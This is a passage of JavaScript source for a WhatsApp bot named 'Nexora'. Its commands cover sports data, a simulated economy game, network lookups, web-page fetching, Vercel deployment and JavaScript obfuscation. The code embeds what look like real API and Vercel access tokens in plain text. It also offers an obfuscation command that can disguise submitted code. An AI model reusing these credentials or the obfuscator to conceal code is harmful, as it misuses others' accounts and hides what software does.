                    thumbnailUrl: "https://files.catbox.moe/wiiv8w.jpg",
                    sourceUrl: "https://www.premierleague.com/tables",
                    mediaType: 1,
                   renderLargerThumbnail: false
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("⚠️ Nexora Engine: Server sync failed.");
    }
}
break;

case 'livescore':
case 'live': {
    await empire.sendMessage(m.chat, { react: { text: '⚽', key: m.key } });

    try {
        const axios = require('axios');
        // Fetching from the David Cyril Sports API
        const res = await axios.get(`https://apis.davidcyril.name.ng/sports/live`);
        
        if (!res.data || !res.data.status || res.data.result.length === 0) {
            return reply("❌ No live football matches currently in progress.");
        }

        const matches = res.data.result;
        let liveMsg = `*── 「 NEXORA LIVE SCORES 」 ──*\n\n`;

        matches.forEach((m, i) => {
            // Formatting: Home vs Away | Score | Time
            liveMsg += `*${i + 1}. ${m.home_name}* ${m.score} *${m.away_name}*\n`;
            liveMsg += `⏱️ Time: ${m.time}'\n`;
            liveMsg += `🏆 League: ${m.league_name}\n`;
            liveMsg += `*━━━━━━━*\n\n`;
        });

        liveMsg += `_Status: Monitoring Live Feed..._`;

        await empire.sendMessage(m.chat, {
            text: liveMsg,
            contextInfo: {
                externalAdReply: {
                    title: "LIVE FOOTBALL TRACKER",
                    body: "Nexora Sports Engine",
                    thumbnailUrl: "https://files.catbox.moe/wiiv8w.jpg",
                    sourceUrl: "https://apis.davidcyril.name.ng",
                    mediaType: 1,
                   renderLargerThumbnail: false
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("⚠️ Nexora Engine: API Connection Error.");
    }
}
break;

case 'player': {
    if (!isCreator) return;
    if (!q) return reply(`Example: ${prefix + command} Messi`);

    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        const axios = require('axios');
        
        const searchUrl = `https://www.thesportsdb.com/api/v1/json/3/searchplayers.php?p=${encodeURIComponent(q)}`;
        const res = await axios.get(searchUrl);

        if (!res.data || !res.data.player) {
            return reply("❌ Player dataset trace failed. Try full name (e.g., Lionel Messi).");
        }

        const p = res.data.player[0]; // Isolate the primary matching search result index Node

        // Establish safe fallback logic for player visual art vectors
        const playerVisualUrl = p.strCutout || p.strRender || p.strThumb || "https://files.catbox.moe/wiiv8w.jpg";

        // Extract first sentence neatly or fall back
        const cleanShortBio = p.strDescriptionEN ? p.strDescriptionEN.split('.')[0] + '.' : 'No tactical profile description logged.';

        // Build the premium dynamic canvas frame asset natively
        const playerCardBuffer = await drawPlayerCard(
            p.strPlayer,
            p.strTeam || "No Club",
            p.strPosition || "Unknown Position",
            p.strNationality || "Unknown",
            p.dateBorn || "N/A",
            p.strHeight || "N/A",
            p.strSide || "N/A",
            cleanShortBio,
            playerVisualUrl
        );

        // Dispatches the compiled image binary asset directly without text captions
        await empire.sendMessage(m.chat, {
            image: playerCardBuffer
        }, { quoted: m });

    } catch (e) {
        console.error("Player Canvas Terminal Render Failure: ", e);
        reply("⚠️ Error syncing with global sports network pipelines.");
    }
}
break;

case 'team':
case 'club': {
    if (!q) return reply(`Please provide a team name.\nExample: ${prefix + command} Real Madrid`);
    
    await empire.sendMessage(m.chat, { react: { text: '🏟️', key: m.key } });

    try {
        const axios = require('axios');
        // Fetching from your provided API
        const res = await axios.get(`https://apis.davidcyril.name.ng/sports/team?name=${encodeURIComponent(q)}`);
        
        if (!res.data || !res.data.status || !res.data.result) {
            return reply(`❌ Could not find details for "${q}". Try another team.`);
        }

        const t = res.data.result;
        
        let teamMsg = `*── 「 TEAM PROFILE 」 ──*\n\n`;
        teamMsg += `*🛡️ Name:* ${t.name}\n`;
        teamMsg += `*🌍 Country:* ${t.country}\n`;
        teamMsg += `*📅 Founded:* ${t.founded}\n`;
        teamMsg += `*🏟️ Stadium:* ${t.stadium_name}\n`;
        teamMsg += `*👥 Capacity:* ${t.stadium_capacity}\n`;
        teamMsg += `*📍 City:* ${t.venue_city}\n\n`;
        
        teamMsg += `_Nexora Sports Intel_`;

        await empire.sendMessage(m.chat, {
            image: { url: t.logo },
            caption: teamMsg,
            contextInfo: {
                externalAdReply: {
                    title: t.name.toUpperCase(),
                    body: `Home of the ${t.name}`,
                    thumbnailUrl: t.logo,
                    sourceUrl: "https://apis.davidcyril.name.ng",
                    mediaType: 1,
                   renderLargerThumbnail: false
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("⚠️ Nexora Engine: Connection to team database failed.");
    }
}
break;


case 'football':
case 'table':
case 'soccer': {
    // Security check first
    if (!isCreator) return;

    const args = q.split(' ');
    const query = args[0]?.toLowerCase();
    
    const leagues = {
        'epl': 'PL',
        'laliga': 'PD',
        'seriaa': 'SA',
        'ligue1': 'FL1',
        'bundesliga': 'BL1'
    };

    if (!query || !leagues[query]) {
        return reply(`*⚽ NEXORA FOOTBALL*\n\n*Usage:* ${prefix + command} [league]\n*Example:* ${prefix + command} epl\n\n*Available:* epl, laliga, seriaa, ligue1, bundesliga`);
    }

    await empire.sendMessage(m.chat, { react: { text: '⚽', key: m.key } });

    try {
        const axios = require('axios');
        const res = await axios.get(`https://api.football-data.org/v4/competitions/${leagues[query]}/standings`, {
            headers: { 'X-Auth-Token': '5dc3e89431c14629b2c166d5523026e1' }
        });

        const standings = res.data.standings[0].table;
        let table = `🏆 *${res.data.competition.name} STANDINGS*\n\n`;
        table += `*Pos  Team          Pts*\n`;
        table += `⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n`;

        standings.slice(0, 15).forEach((row) => {
            const teamName = row.team.shortName || row.team.name;
            const name = teamName.length > 12 ? teamName.substring(0, 12) + '.' : teamName.padEnd(13);
            table += `\`${row.position.toString().padEnd(3)}\` ${name}  *${row.points}*\n`;
        });

        await empire.sendMessage(m.chat, { 
            text: table,
            contextInfo: {
                externalAdReply: {
                    title: "NEXORA SPORTS",
                    body: `Live ${query.toUpperCase()} Updates`,
                    thumbnailUrl: "https://files.catbox.moe/wiiv8w.jpg",
                    sourceUrl: "https://www.football-data.org/",
                    mediaType: 1
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("⚠️ Error fetching data. Please check your API key or connection.");
    }
}
break;




case 'mirror-txt': {
    if (!isCreator) return;
    if (!text) return reply("🪞 Example: .mirror hello");

    const map = { a:'ɐ', b:'q', c:'ɔ', d:'p', e:'ǝ', f:'ɟ', g:'ɓ', h:'ɥ', i:'ᴉ', j:'ɾ', k:'ʞ', l:'ʃ', m:'ɯ', n:'u', o:'o', p:'d', q:'b', r:'ɹ', s:'s', t:'ʇ', u:'n', v:'ʌ', w:'ʍ', x:'x', y:'ʎ', z:'z' };

    let mirrored = text.split('').reverse().map(c => map[c.toLowerCase()] || c).join('');

    reply(`🪞 ${mirrored}`);
}
break;

case 'font': {
    if (!isCreator) return;
    if (!text) return reply("🔤 Example: .font Nexora");

    const fonts = {
        bold: t => t.replace(/[a-z]/gi, c => String.fromCharCode(c.charCodeAt(0) + 119743)),
        smallcaps: t => t.toLowerCase().replace(/[a-z]/g, c => "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ"["abcdefghijklmnopqrstuvwxyz".indexOf(c)] || c),
        bubble: t => t.replace(/[a-z]/gi, c => String.fromCharCode(c.charCodeAt(0) + 9333)),
    };

    let msg = `✨ *FONT STYLES*\n\n`;
    msg += `🔹 Bold:\n${fonts.bold(text)}\n\n`;
    msg += `🔹 Small Caps:\n${fonts.smallcaps(text)}\n\n`;
    msg += `🔹 Bubble:\n${fonts.bubble(text)}`;

    reply(msg);
}
break;
case 'trace':
case 'traceroute': {
    if (!text) return reply("🛰️ Provide a domain/IP to trace!");
    await empire.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });

    try {
        const axios = require('axios');
        // Using HackerTarget's MTR/Traceroute tool
        const res = await axios.get(`https://api.hackertarget.com/mtr/?q=${text}`);

        let report = `⚡ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗧𝗥𝗔𝗖𝗘*\n\n`;
        report += `🌐 *Target:* ${text}\n`;
        report += `\`\`\`${res.data}\`\`\`\n\n`;
        report += `_Signal path resolved via global BGP nodes._`;

        reply(report);
    } catch (e) {
        reply("❌ Signal lost between nodes. Target is unreachable.");
    }
}
break;
case 'encrypt': {
    if (!isCreator) return;
    
    let codeToEncrypt = "";
    let fileName = `Encrypted_${Math.floor(Math.random() * 10000)}.js`;

    try {
        // 1. EXTRACTION LOGIC
        if (m.quoted && m.quoted.mtype === 'documentMessage') {
            console.log("Reading from document...");
            let buffer = await m.quoted.download();
            if (!buffer) return reply("❌ Failed to download file. Try again.");
            codeToEncrypt = buffer.toString('utf8');
            fileName = m.quoted.fileName;
        } else if (m.quoted && m.quoted.text) {
            console.log("Reading from quoted text...");
            codeToEncrypt = m.quoted.text;
        } else if (text) {
            console.log("Reading from direct text...");
            codeToEncrypt = text;
        } else {
            return reply("ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴊs ᴄᴏᴅᴇ ᴏʀ ғɪʟᴇ.");
        }

        await empire.sendMessage(m.chat, { react: { text: '🔐', key: m.key } });

        const JavaScriptObfuscator = require('javascript-obfuscator');
        const AdmZip = require('adm-zip');

        // 2. OBFUSCATION
        console.log("Starting encryption...");
        const obfuscationResult = JavaScriptObfuscator.obfuscate(codeToEncrypt, {
            compact: true,
            controlFlowFlattening: true,
            identifierNamesGenerator: 'hexadecimal',
            stringArray: true,
            stringArrayEncoding: ['base64'],
            stringArrayThreshold: 1
        });

        const resultCode = obfuscationResult.getObfuscatedCode();
        console.log("Encryption successful. Zipping...");

        // 3. ZIP CREATION
        const zip = new AdmZip();
        zip.addFile(fileName, Buffer.from(resultCode, 'utf8'));
        const zipBuffer = zip.toBuffer();

        // 4. SENDING
        await empire.sendMessage(m.chat, {
            document: zipBuffer,
            mimetype: 'application/zip',
            fileName: fileName.replace('.js', '_Secure.zip'),
            caption: `✅ *𝖤𝖭𝖢𝖱𝖸𝖯𝖳𝖨𝖮𝖭 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤*\n\n📦 *File:* ${fileName}`
        }, { quoted: m });
        
        console.log("File sent to user.");

    } catch (e) {
        console.log("ENCRYPTION ERROR:", e);
        reply("❌ *𝖤𝖱𝖱𝖮𝖱:* Encryption failed. Check console for details.");
    }
}
break;





case 'encrypt-code': {
    if (!isCreator) return;
    
    // Get code from text, or quoted message
    let codeToEncrypt = text ? text : (m.quoted && m.quoted.text) ? m.quoted.text : null;
    
    if (!codeToEncrypt) return reply("ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴊs ᴄᴏᴅᴇ ᴏʀ ᴛʏᴘᴇ ᴛʜᴇ ᴄᴏᴅᴇ ᴀғᴛᴇʀ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ.");

    await empire.sendMessage(m.chat, { react: { text: '🔐', key: m.key } });
    
    try {
        const JavaScriptObfuscator = require('javascript-obfuscator');
        const AdmZip = require('adm-zip');

        // 1. Obfuscate the code
        const obfuscationResult = JavaScriptObfuscator.obfuscate(codeToEncrypt, {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            deadCodeInjection: true,
            deadCodeInjectionThreshold: 1,
            identifierNamesGenerator: 'hexadecimal',
            renameGlobals: false,
            stringArray: true,
            stringArrayEncoding: ['base64'],
            stringArrayThreshold: 1,
            transformObjectKeys: true,
            unicodeEscapeSequence: false
        });

        const resultCode = obfuscationResult.getObfuscatedCode();

        // 2. Create the ZIP in memory
        const zip = new AdmZip();
        const fileName = `Encrypted_${Math.floor(Math.random() * 10000)}.js`;
        zip.addFile(fileName, Buffer.from(resultCode, 'utf8'));
        const zipBuffer = zip.toBuffer();

        // 3. Send the ZIP file
        await empire.sendMessage(m.chat, {
            document: zipBuffer,
            mimetype: 'application/zip',
            fileName: 'Nexora_Encrypted_JS.zip',
            caption: `✅ *𝖤𝖭𝖢𝖱𝖸𝖯𝖳𝖨𝖮𝖭 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤*\n\n` +
                     `📦 *File:* ${fileName}\n` +
                     `🛡️ *Status:* Obfuscated & Zipped\n` +
                     `👤 *By:* ${m.pushName}`
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("❌ *𝖤𝖱𝖱𝖮𝖱:* Ensure your JavaScript code has no syntax errors before encrypting.");
    }
}
break;
// ==========================================
// 🎮 NEXORA LIFE SIMULATOR SUITE
// ==========================================

case 'profile':
case 'me': {
    if (!isCreator) return;
    const fs = require('fs');
    const simBannerPath = getRandomImage('./media/banners/');
    const simBuffer = fs.readFileSync(simBannerPath);

    const target = m.quoted ? m.quoted.sender : (m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.sender);
    const profileName = m.quoted ? "User" : (m.mentionedJid && m.mentionedJid[0] ? "User" : m.pushName);
    
    if (!db.simulator[target]) {
        db.simulator[target] = { cash: 100, job: "Unemployed", inventory: [] };
        saveDB();
    }

    const data = db.simulator[target];
    
    // Format assets array into string blocks
    const propertyList = data.inventory.length > 0 
        ? data.inventory.map(item => `${item.icon} ${item.name}`).join('\n├ ') 
        : "None (Broke status)";

    // Calculate dynamic job scaling based on cash metrics
    if (data.cash > 1000000) data.job = "Tech Mogul 👑";
    else if (data.cash > 100000) data.job = "Senior Software Dev 💻";
    else if (data.cash > 10000) data.job = "Script Automation Architect ⚙️";
    else data.job = "Freelance Hustler 🛠️";

    let profileCard = `*── 「 𝗡𝗘𝗫𝗢𝗥𝗔 𝗟𝗜𝗙𝗘 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 」 ──*\n\n` +
                      `👤 *Identity:* ${profileName}\n` +
                      `💼 *Profession:* ${data.job}\n` +
                      `💵 *Liquid Cash:* $${data.cash.toLocaleString()}\n` +
                      `⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n` +
                      `📦 *ACQUIRED PROPERTIES & ASSETS:*\n` +
                      `┌ ${propertyList}\n` +
                      `└⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n` +
                      `💡 _Keep running commands to earn active revenue payloads._`;

    await empire.sendMessage(m.chat, {
        image: simBuffer,
        caption: profileCard,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${profileName.toUpperCase()}'S FINANCIAL MATRIX`,
                body: `Net Balance: $${data.cash.toLocaleString()}`,
                thumbnail: simBuffer,
                mediaType: 1,
               renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
}
break;
case 'gamble':
case 'bet': {
    if (!isCreator) return;
    if (!args[0]) return reply(`⚠️ State an amount to bet.\n💡 *Example:* \`${prefix + command} 500\``);
    
    let userData = db.simulator[m.sender] || { cash: 100, job: "Unemployed", inventory: [] };
    let betAmount = args[0].toLowerCase() === 'all' ? userData.cash : parseInt(args[0]);

    if (isNaN(betAmount) || betAmount <= 0) return reply("❌ Please enter a valid positive number.");
    if (userData.cash < betAmount) return reply(`❌ Insufficient funds. Your current balance is $${userData.cash.toLocaleString()}`);
    if (betAmount < 100) return reply("❌ Minimum bet threshold is $100.");

    // 50% Win Rate configuration
    let win = Math.random() >= 0.5;

    if (win) {
        userData.cash += betAmount;
        reply(`🎲 *DICE ROLL SUCCESS!* \n\nYou won **$${betAmount.toLocaleString()}**!\n💰 *New Balance:* $${userData.cash.toLocaleString()}`);
    } else {
        userData.cash -= betAmount;
        reply(`🎲 *DICE ROLL CRASHED!* \n\nYou lost **$${betAmount.toLocaleString()}**.\n📉 *New Balance:* $${userData.cash.toLocaleString()}`);
    }
    
    db.simulator[m.sender] = userData;
    saveDB();
}
break;

case 'deployvercel':
case 'hostweb':
case 'vercel': {
    if (!isCreator) return;
    if (!m.quoted || m.quoted.mtype !== 'documentMessage') return reply("❌ Reply to a .zip file.");
    
    // Safely extract the document message object properties
    const docMsg = m.quoted.message.documentMessage;
    const fileName = docMsg.fileName || '';
    if (!fileName.toLowerCase().endsWith('.zip')) return reply("❌ Must be a .zip file.");

    // CONFIGURATION
    const VERCEL_TOKEN = "Vcp_4eKhVnENKmhGCVgRPxRFNg9cxixwVvJaDAyQhdVYPqQGlDOHdR0RfrTA"; 
    const PROJECT_NAME = "nexora-hosted-site-" + Math.floor(Math.random() * 10000);

    await empire.sendMessage(m.chat, { react: { text: '🔺', key: m.key } });
    reply("⚡ *Vercel Engine:* Extracting repository bundle and provisioning edge resources...");

    try {
        const axios = require('axios');
        const AdmZip = require('adm-zip');

        // 1. Stream download the zip binary from the WhatsApp media storage servers
        const stream = await downloadContentFromMessage(docMsg, 'document');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        // 2. Unzip file directly inside memory buffer array
        const zip = new AdmZip(buffer);
        const zipEntries = zip.getEntries();
        const vercelFilesPayload = [];

        // 3. Loop through extracted contents and translate them into Vercel file objects
        zipEntries.forEach((entry) => {
            // Ignore directory entries; Vercel builds directories implicitly based on file names
            if (!entry.isDirectory) {
                const fileDataBuffer = entry.getData();
                vercelFilesPayload.push({
                    file: entry.entryName, // Keeps full path mapping (e.g., "src/index.html")
                    data: fileDataBuffer.toString('base64'),
                    encoding: 'base64'
                });
            }
        });

        if (vercelFilesPayload.length === 0) {
            return reply("❌ The attached archive file appears to be completely empty.");
        }

        // 4. Fire the deployment to Vercel's multi-cloud infrastructure
        const response = await axios.post('https://api.vercel.com/v13/deployments', {
            name: PROJECT_NAME,
            files: vercelFilesPayload, // Sending the clean, individual unzipped file schema array
            projectSettings: { 
                framework: null // Set to null for raw, static HTML/JS/CSS sites
            }
        }, {
            headers: {
                'Authorization': `Bearer ${VERCEL_TOKEN}`,
                'Content-Type': 'application/json'
            }
        });

        const data = response.data;
        const liveLink = `https://${data.url}`;

        const successText = `🔺 *VERCEL DEPLOYMENT SUCCESSFUL* 🔺\n\n` +
                            `📦 *Project Name:* ${PROJECT_NAME}\n` +
                            `🆔 *Deployment ID:* ${data.id}\n\n` +
                            `🔗 *LIVE URL:* \n${liveLink}\n\n` +
                            `💡 _Your site is now securely hosted on Vercel's global edge network!_`;

        await empire.sendMessage(m.chat, { text: successText }, { quoted: m });

    } catch (error) {
        console.error(error);
        const errMsg = error.response?.data?.error?.message || error.message;
        reply(`❌ *Vercel Deployment Failed:* ${errMsg}`);
    }
}
break;


case 'work': {
if (!isCreator) return;
    global.workCooldown = global.workCooldown || {};
    const lastUsed = global.workCooldown[m.sender] || 0;
    const cooldownTime = 10 * 60 * 1000; // 10 minutes cooldown loop

    if (Date.now() - lastUsed < cooldownTime) {
        const remaining = cooldownTime - (Date.now() - lastUsed);
        const mins = Math.floor(remaining / 1000 / 60);
        const secs = Math.floor((remaining / 1000) % 60);
        return reply(`⏳ *Exhaustion Alert:* Your energy is depleted. You can return to work in *${mins}m ${secs}s*.`);
    }

    let userData = db.simulator[m.sender] || { cash: 100, job: "Freelance Hustler 🛠️", inventory: [] };
    
    // Custom job payout multiplier calculation
    let baseSalary = Math.floor(Math.random() * (1200 - 600 + 1)) + 600;
    userData.cash += baseSalary;

    global.workCooldown[m.sender] = Date.now();
    db.simulator[m.sender] = userData;
    saveDB();

    reply(`💼 *WORK SHIFT COMPLETED*\n\nYou clocked in as a *${userData.job || "Hustler"}*.\n💵 *Salary Paid:* $${baseSalary.toLocaleString()}\n💰 *Total Liquid Balance:* $${userData.cash.toLocaleString()}`);
}
break;



case 'rob':
case 'steal': {
  if (!isCreator) return;
    if (!m.isGroup) return reply("❌ This command only works in groups.");
    
    const target = m.quoted ? m.quoted.sender : (m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : null);
    if (!target) return reply("⚠️ Reply or tag a wealthy target to rob them.");
    if (target === m.sender) return reply("❌ You cannot rob your own vault.");

    let robberData = db.simulator[m.sender] || { cash: 100, job: "Unemployed", inventory: [] };
    let victimData = db.simulator[target] || { cash: 100, job: "Unemployed", inventory: [] };

    if (victimData.cash < 500) return reply("📭 Target is too broke to be worth the heat.");
    if (robberData.cash < 300) return reply("❌ You need at least $300 to finance a robbery attempt.");

    // 35% Success Rate
    let success = Math.random() < 0.45;

    if (success) {
        let stolenCash = Math.floor(victimData.cash * (Math.random() * (0.25 - 0.10) + 0.10)); // Steals 10% to 25%
        robberData.cash += stolenCash;
        victimData.cash -= stolenCash;

        await empire.sendMessage(m.chat, {
            text: `🥷 *HEIST SUCCESSFUL!*\n\n@${m.sender.split('@')[0]} successfully breached the vault of @${target.split('@')[0]} and escaped with **$${stolenCash.toLocaleString()}**!`,
            mentions: [m.sender, target]
        }, { quoted: m });
    } else {
        let fine = 400;
        robberData.cash = Math.max(0, robberData.cash - fine);
        
        await empire.sendMessage(m.chat, {
            text: `🚨 *HEIST FAILED!* \n\n@${m.sender.split('@')[0]} tripped the laser grids while trying to rob @${target.split('@')[0]}.\n👮‍♂️ Local law enforcement intervened and fined you **$${fine}**!`,
            mentions: [m.sender, target]
        }, { quoted: m });
    }

    db.simulator[m.sender] = robberData;
    db.simulator[target] = victimData;
    saveDB();
}
break;

case 'pay':
case 'transfer': {
    if (!isCreator) return;
    if (!m.isGroup) return reply("❌ This command only works in groups.");
    
    const target = m.quoted ? m.quoted.sender : (m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : null);
    if (!target) return reply(`⚠️ Tag or reply to a user to pay them.`);
    if (target === m.sender) return reply("❌ You cannot wire cash to yourself.");

    const amountInput = m.quoted ? args[0] : args[1];
    const transferAmount = parseInt(amountInput);

    if (isNaN(transferAmount) || transferAmount <= 0) return reply("❌ State a valid positive cash amount.");

    let senderData = db.simulator[m.sender] || { cash: 100, job: "Unemployed", inventory: [] };
    if (senderData.cash < transferAmount) return reply("❌ Transaction declined: Insufficient liquid capital.");

    let receiverData = db.simulator[target] || { cash: 100, job: "Unemployed", inventory: [] };

    // Execute Wire Balance Change
    senderData.cash -= transferAmount;
    receiverData.cash += transferAmount;

    db.simulator[m.sender] = senderData;
    db.simulator[target] = receiverData;
    saveDB();

    await empire.sendMessage(m.chat, {
        text: `💸 *WIRE TRANSFER COMPLETED*\n\n📤 *Sender:* @${m.sender.split('@')[0]}\n📥 *Receiver:* @${target.split('@')[0]}\n💰 *Amount:* $${transferAmount.toLocaleString()}`,
        mentions: [m.sender, target]
    }, { quoted: m });
}
break;

case 'leaderboard':
case 'top': {
if (!isCreator) return;
    if (!m.isGroup) return reply("❌ This command only works in groups.");
    
    const fs = require('fs');
    const boardBannerPath = getRandomImage('./media/banners/');
    const boardBuffer = fs.readFileSync(boardBannerPath);

    if (!db.simulator || Object.keys(db.simulator).length === 0) {
        return reply("📉 *The economy database is currently empty.* Run some commands first!");
    }

    // 1. Map and sort users dynamically from highest cash to lowest
    const sortedEconomy = Object.keys(db.simulator)
        .map(jid => {
            return {
                jid: jid,
                cash: db.simulator[jid].cash || 0,
                inventory: db.simulator[jid].inventory || []
            };
        })
        .sort((a, b) => b.cash - a.cash); // Highest to lowest

    // 2. Build the leaderboard display array (Top 10 or Top 15 to keep chat clean)
    const maxDisplay = Math.min(sortedEconomy.length, 10); 
    let leaderboardMsg = `*── 「 𝗡𝗘x𝗢𝗥𝗔 𝗚𝗟𝗢𝗕𝗔𝗟 𝗪𝗘𝗔𝗟𝗧𝗛 」 ──*\n\n`;
    let mentionsArray = [];

    for (let i = 0; i < maxDisplay; i++) {
        const userRow = sortedEconomy[i];
        const userJid = userRow.jid;
        const userCash = userRow.cash;
        const userInv = userRow.inventory;

        // Rank medals customization
        let rankBadge = `${i + 1}.`;
        if (i === 0) rankBadge = "🥇";
        else if (i === 1) rankBadge = "🥈";
        else if (i === 2) rankBadge = "🥉";

        // Get their most expensive asset as their "Top Achievement"
        let topAchievement = "No Assets";
        if (userInv.length > 0) {
            // Match inventory items against global shop rules to find their highest value item
            const valuedItems = userInv.map(invItem => {
                const marketMatch = global.nexoraShop.find(shopItem => shopItem.name === invItem.name);
                return { ...invItem, price: marketMatch ? marketMatch.price : 0 };
            }).sort((a, b) => b.price - a.price);

            if (valuedItems[0]) {
                topAchievement = `${valuedItems[0].icon} ${valuedItems[0].name}`;
            }
        }

        leaderboardMsg += `${rankBadge} *@${userJid.split('@')[0]}*\n`;
        leaderboardMsg += `💵 *Cash:* $${userCash.toLocaleString()}\n`;
        leaderboardMsg += `🏆 *Flex:* _${topAchievement}_\n`;
        leaderboardMsg += `⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n`;

        mentionsArray.push(userJid);
    }

    leaderboardMsg += `\n💡 _Type *${prefix}profile* to look up your personal holding profile matrix._`;

    // 3. Dispatch payload with tracking analytics banner
    await empire.sendMessage(m.chat, {
        image: boardBuffer,
        caption: leaderboardMsg,
        mentions: mentionsArray,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: "FORBES ECO-METRICS SYSTEM",
                body: `Active Economy Users Tracked: ${sortedEconomy.length}`,
                thumbnail: boardBuffer,
                mediaType: 1,
               renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
}
break;

case 'shop':
case 'market': {
    if (!isCreator) return;
    let shopMsg = `*── 「 𝗡𝗘𝗫𝗢𝗥𝗔 𝗘𝗠𝗣𝗜𝗥𝗘 𝗠𝗔𝗥𝗞𝗘𝗧 」 ──*\n\n` +
                  `Use \`${prefix}buy [Item ID]\` to acquire assets.\n\n`;

    global.nexoraShop.forEach(item => {
        shopMsg += `🆔 *ID:* \`${item.id}\` \n` +
                   `${item.icon} *Asset:* ${item.name}\n` +
                   `💰 *Price:* $${item.price.toLocaleString()}\n` +
                   `⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n`;
    });

    reply(shopMsg);
}
break;

case 'buy': {
    if (!isCreator) return;
    if (!args[0]) return reply(`⚠️ Please provide the Item ID code from the marketplace.\n💡 *Example:* \`${prefix}buy 3\``);
    
    const itemId = parseInt(args[0]);
    const selectedItem = global.nexoraShop.find(item => item.id === itemId);
    
    if (!selectedItem) return reply("❌ Invalid Item ID. View options using `.shop`.");

    const userData = db.simulator[m.sender] || { cash: 100, job: "Unemployed", inventory: [] };

    if (userData.cash < selectedItem.price) {
        return reply(`❌ *TRANSACTION REJECTED:* Insufficient capital.\n\n💵 *Your Balance:* $${userData.cash.toLocaleString()}\n🏷️ *Required Price:* $${selectedItem.price.toLocaleString()}\n\n_Keep using more bot commands to gather cash!_`);
    }

    // Process Transaction Mechanics
    userData.cash -= selectedItem.price;
    userData.inventory.push({ name: selectedItem.name, icon: selectedItem.icon, type: selectedItem.type });
    
    db.simulator[m.sender] = userData;
    saveDB();

    reply(`🎉 *PURCHASE SUCCESSFUL!*\n\nYou bought a **${selectedItem.name}** ${selectedItem.icon} for **$${selectedItem.price.toLocaleString()}**.\nCheck your updated holdings with \`${prefix}profile\`.`);
}
break;

case 'fetch': 
case 'source-code' : {
    if (!isCreator) return reply("🔱 *ACCESS DENIED*");
    if (!text) return reply(`🕵️‍♂️ Provide a URL!`);
    
    let url = text.startsWith('http') ? text : `https://${text}`;
    await empire.sendMessage(m.chat, { react: { text: '🌐', key: m.key } });

    try {
        const axios = require('axios');
        const fs = require('fs');

        // We use a specialized mirroring API or high-level fetch
        // This ensures we get more than just the raw skeleton
        const res = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            }
        });

        const htmlContent = res.data;
        const fileName = `${new URL(url).hostname}_full.html`;
        
        // We wrap the content in a base tag so the CSS/Images try to load from the original site
        const enrichedHtml = htmlContent.includes('<head>') 
            ? htmlContent.replace('<head>', `<head><base href="${url}">`) 
            : `<base href="${url}">${htmlContent}`;

        fs.writeFileSync(`./${fileName}`, enrichedHtml);

        await empire.sendMessage(m.chat, { 
            document: fs.readFileSync(`./${fileName}`), 
            mimetype: 'text/html', 
            fileName: fileName,
            caption: `🌐 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗪𝗘𝗕 𝗠𝗜𝗥𝗥𝗢𝗥*\n\n✅ *Full Source Captured*\n📦 *Target:* ${url}\n\n_Note: Open this file in a browser to see the full CSS/Layout rendering._`
        }, { quoted: m });

        fs.unlinkSync(`./${fileName}`);

    } catch (e) {
        reply(`❌ *FETCH FAILED:* ${e.message}`);
    }
}
break;


case 'ssl':
case 'cert': {
    if (!text) return reply("🔐 Provide a domain! Example: .ssl binance.com");
    await empire.sendMessage(m.chat, { react: { text: '🔐', key: m.key } });

    try {
        const axios = require('axios');
        // Scraping SSL info or using a specialized API
        const res = await axios.get(`https://api.hackertarget.com/ssllookup/?q=${text}`);
        
        let report = `🔐 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗖𝗘𝗥𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗘 𝗩𝗔𝗨𝗟𝗧*\n\n`;
        report += `🌐 *Domain:* ${text}\n\n`;
        report += `\`\`\`${res.data.split('\n').slice(0, 12).join('\n')}\`\`\`\n\n`;
        report += `_Verification complete. Encryption integrity confirmed._`;

        reply(report);
    } catch (e) {
        reply("❌ Could not retrieve handshake data.");
    }
}
break;
case 'hashid': {
    if (!text) return reply("🔐 Provide a hash to identify.");
    
